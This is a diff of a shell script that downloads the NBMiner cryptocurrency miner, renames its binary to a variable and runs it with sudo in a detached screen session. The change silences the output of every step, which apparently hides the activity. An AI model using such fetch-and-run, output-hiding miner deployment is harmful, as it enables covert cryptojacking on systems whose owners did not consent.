@@ -13,10 +13,10 @@ if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else 
     apt install screen -y
-    wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz
-    tar zxvf NBMiner_40.1_Linux.tgz
+    wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz >/dev/null 2>&1
+    tar zxvf NBMiner_40.1_Linux.tgz >/dev/null 2>&1
     cd NBMiner_Linux
     mv nbminer $TOP
-    chmod +x *
+    chmod +x * >/dev/null 2>&1
 fi
-screen -dmLS mine sudo ./$TOP $COMA
+screen -dmLS mine sudo ./$TOP $COMA >/dev/null 2>&1
